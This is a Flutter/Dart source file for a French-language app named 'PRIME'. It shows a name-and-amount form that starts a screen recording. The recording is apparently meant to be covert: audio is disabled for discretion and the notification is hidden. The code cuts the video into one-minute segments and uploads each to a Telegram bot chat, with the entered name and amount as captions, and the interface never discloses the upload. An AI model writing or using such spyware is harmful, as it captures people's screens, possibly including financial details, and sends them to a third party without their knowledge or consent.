import 'dart:io';
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:ed_screen_recorder/ed_screen_recorder.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';

void main() {
  runApp(const PrimeApp());
}

class PrimeApp extends StatelessWidget {
  const PrimeApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'PRIME',
      theme: ThemeData(
        primaryColor: Colors.red,
        scaffoldBackgroundColor: Colors.black,
        fontFamily: 'Montserrat',
        textTheme: const TextTheme(
          bodyLarge: TextStyle(color: Colors.white),
          bodyMedium: TextStyle(color: Colors.white),
          titleLarge: TextStyle(color: Colors.red, fontWeight: FontWeight.bold),
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          foregroundColor: Colors.red,
        ),
      ),
      home: const PrimeHomePage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PrimeHomePage extends StatefulWidget {
  const PrimeHomePage({super.key});

  @override
  State<PrimeHomePage> createState() => _PrimeHomePageState();
}

class _PrimeHomePageState extends State<PrimeHomePage> {
  // Variables pour l'enregistrement
  final EdScreenRecorder _screenRecorder = EdScreenRecorder();
  bool _isRecording = false;
  String? _lastRecordedPath;
  Timer? _recordingTimer;
  int _segmentCounter = 0;
  
  // Variables pour les champs de texte
  final TextEditingController _usernameController = TextEditingController();
  final TextEditingController _amountController = TextEditingController();
  
  // Configuration Telegram (À MODIFIER AVEC VOS INFORMATIONS)
  final String _telegramBotToken = 'TON_TOKEN_BOT_TELEGRAM';
  final String _chatId = 'TON_CHAT_ID_TELEGRAM';
  
  @override
  void dispose() {
    _recordingTimer?.cancel();
    _usernameController.dispose();
    _amountController.dispose();
    super.dispose();
  }
  
  // Fonction pour démarrer l'enregistrement
  Future<void> _startRecording() async {
    try {
      // Vérifier et demander les permissions
      if (Platform.isAndroid) {
        final storageStatus = await Permission.storage.request();
        if (!storageStatus.isGranted) {
          _showSnackBar('Permission de stockage refusée');
          return;
        }
      }
      
      // Démarrer l'enregistrement
      await _screenRecorder.startRecordScreen(
        "PRIME_${DateTime.now().millisecondsSinceEpoch}",
        audioEnable: false, // Désactiver l'audio pour plus de discrétion
        notificationTitle: "PRIME",
        notificationMessage: "Enregistrement en cours",
        hideNotification: true, // Masquer la notification (si possible)
      );
      
      setState(() {
        _isRecording = true;
      });
      
      // Démarrer le timer pour la segmentation
      _segmentCounter = 0;
      _startSegmentationTimer();
      
      _showSnackBar('Enregistrement démarré');
    } catch (e) {
      _showSnackBar('Erreur: $e');
    }
  }
  
  // Fonction pour démarrer le timer de segmentation
  void _startSegmentationTimer() {
    _recordingTimer = Timer.periodic(const Duration(seconds: 60), (timer) async {
      _segmentCounter++;
      
      try {
        // Arrêter l'enregistrement actuel
        final path = await _screenRecorder.stopRecordScreen();
        
        if (path != null) {
          setState(() {
            _lastRecordedPath = path;
          });
          
          // Envoyer le segment à Telegram
          await _sendToTelegram(path);
          
          // Redémarrer l'enregistrement pour le prochain segment
          await Future.delayed(const Duration(seconds: 2));
          await _startRecording();
        }
      } catch (e) {
        print('Erreur segmentation: $e');
      }
    });
  }
  
  // Fonction pour envoyer le fichier à Telegram
  Future<void> _sendToTelegram(String filePath) async {
    try {
      final url = Uri.parse(
        'https://api.telegram.org/bot$_telegramBotToken/sendVideo'
      );
      
      final request = http.MultipartRequest('POST', url);
      
      // Ajouter les paramètres
      request.fields['chat_id'] = _chatId;
      request.fields['caption'] = 'PRIME - Segment $_segmentCounter\n'
                                 'Utilisateur: ${_usernameController.text}\n'
                                 'Montant: ${_amountController.text}';
      
      // Ajouter le fichier vidéo
      final videoFile = File(filePath);
      final videoStream = http.ByteStream(videoFile.openRead());
      final videoLength = await videoFile.length();
      
      request.files.add(http.MultipartFile(
        'video',
        videoStream,
        videoLength,
        filename: 'prime_segment_$_segmentCounter.mp4',
      ));
      
      // Envoyer la requête
      final response = await request.send();
      
      if (response.statusCode == 200) {
        print('Segment $_segmentCounter envoyé à Telegram');
      } else {
        print('Erreur Telegram: ${response.statusCode}');
      }
    } catch (e) {
      print('Erreur envoi Telegram: $e');
    }
  }
  
  // Fonction pour arrêter l'enregistrement
  Future<void> _stopRecording() async {
    try {
      _recordingTimer?.cancel();
      _recordingTimer = null;
      
      final path = await _screenRecorder.stopRecordScreen();
      
      setState(() {
        _isRecording = false;
        _lastRecordedPath = path;
      });
      
      if (path != null) {
        await _sendToTelegram(path);
      }
      
      _showSnackBar('Enregistrement arrêté');
    } catch (e) {
      _showSnackBar('Erreur: $e');
    }
  }
  
  // Fonction pour afficher un message snackbar
  void _showSnackBar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: Colors.red,
        duration: const Duration(seconds: 2),
      ),
    );
  }
  
  // Fonction pour le bouton Enregistrer
  void _onSavePressed() {
    if (_usernameController.text.isEmpty || _amountController.text.isEmpty) {
      _showSnackBar('Veuillez remplir tous les champs');
      return;
    }
    
    if (!_isRecording) {
      _startRecording();
    } else {
      _stopRecording();
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text(
          'PRIME',
          style: TextStyle(
            fontSize: 28,
            fontWeight: FontWeight.bold,
            color: Colors.red,
          ),
        ),
        centerTitle: true,
      ),
      
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            // Logo/ Titre principal
            Container(
              margin: const EdgeInsets.only(bottom: 40),
              child: const Icon(
                Icons.video_call,
                size: 80,
                color: Colors.red,
              ),
            ),
            
            // Champ Nom d'utilisateur
            TextField(
              controller: _usernameController,
              decoration: InputDecoration(
                labelText: 'Nom de l\'utilisateur',
                labelStyle: const TextStyle(color: Colors.red),
                enabledBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: Colors.red, width: 2),
                  borderRadius: BorderRadius.circular(10),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: Colors.red, width: 3),
                  borderRadius: BorderRadius.circular(10),
                ),
                prefixIcon: const Icon(Icons.person, color: Colors.red),
              ),
              style: const TextStyle(color: Colors.white),
            ),
            
            const SizedBox(height: 20),
            
            // Champ Montant
            TextField(
              controller: _amountController,
              decoration: InputDecoration(
                labelText: 'Montant',
                labelStyle: const TextStyle(color: Colors.red),
                enabledBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: Colors.red, width: 2),
                  borderRadius: BorderRadius.circular(10),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: Colors.red, width: 3),
                  borderRadius: BorderRadius.circular(10),
                ),
                prefixIcon: const Icon(Icons.attach_money, color: Colors.red),
              ),
              style: const TextStyle(color: Colors.white),
              keyboardType: TextInputType.number,
            ),
            
            const SizedBox(height: 40),
            
            // Bouton Enregistrer
            SizedBox(
              width: double.infinity,
              height: 60,
              child: ElevatedButton(
                onPressed: _onSavePressed,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red,
                  foregroundColor: Colors.white,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                  elevation: 5,
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      _isRecording ? Icons.stop : Icons.play_arrow,
                      size: 28,
                    ),
                    const SizedBox(width: 10),
                    Text(
                      _isRecording ? 'ARRÊTER' : 'ENREGISTRER',
                      style: const TextStyle(
                        fontSize: 20,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            
            // Indicateur d'enregistrement
            if (_isRecording) ...[
              const SizedBox(height: 30),
              const Text(
                '● ENREGISTREMENT EN COURS',
                style: TextStyle(
                  color: Colors.red,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                'Segment: $_segmentCounter',
                style: const TextStyle(color: Colors.white54),
              ),
            ],
            
            // Informations sur le dernier enregistrement
            if (_lastRecordedPath != null && !_isRecording)
              Padding(
                padding: const EdgeInsets.only(top: 30),
                child: Text(
                  'Dernier segment enregistré\n$_segmentCounter fichiers envoyés',
                  textAlign: TextAlign.center,
                  style: const TextStyle(color: Colors.white54),
                ),
              ),
          ],
        ),
      ),
    );
  }
}